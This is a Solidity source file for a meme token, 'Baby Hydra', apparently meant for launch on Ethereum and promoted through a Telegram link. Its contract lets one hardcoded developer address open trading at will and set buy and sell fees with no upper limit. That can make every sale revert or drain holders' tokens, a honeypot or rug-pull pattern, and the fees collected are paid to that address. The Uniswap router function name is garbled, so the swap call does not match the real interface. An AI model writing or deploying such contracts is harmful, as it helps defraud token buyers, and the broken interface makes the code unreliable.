/*

  _    _           _           ____        _           
 | |  | |         | |         |  _ \      | |          
 | |__| |_   _  __| |_ __ __ _| |_) | __ _| |__  _   _ 
 |  __  | | | |/ _` | '__/ _` |  _ < / _` | '_ \| | | |
 | |  | | |_| | (_| | | | (_| | |_) | (_| | |_) | |_| |
 |_|  |_|\__, |\__,_|_|  \__,_|____/ \__,_|_.__/ \__, |
          __/ |                                   __/ |
         |___/                                   |___/ 

TELE: https://t.me/HydraBaby
*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFEEETOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract BHYDRA {
        
        string public   name_ = unicode"Baby Hydra"; 
        string public   symbol_ = unicode"BABYHYDRA";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 8888888888 * 10**decimals;

        uint256 buyFEEET = 0;
        uint256 sellFEEET = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed MasterDevv,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant MasterDevv = payable(address(0xeA1E60Df386f4B0bdcBCFD8E3872fCE947660072));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == MasterDevv || to == MasterDevv);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFEEETOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                MasterDevv.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FEEETAmount = amount * (from == pair ? buyFEEET : sellFEEET) / 100;
                amount -= FEEETAmount;
                balanceOf[address(this)] += FEEETAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == MasterDevv);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFEEET(uint256 _buy, uint256 _sell) private {
            buyFEEET = _buy;
            sellFEEET = _sell;
        }

        function setFEEET(uint256 _buy, uint256 _sell) external {
            if(msg.sender != MasterDevv)        
                revert Permissions();
            _setFEEET(_buy, _sell);
        }
    }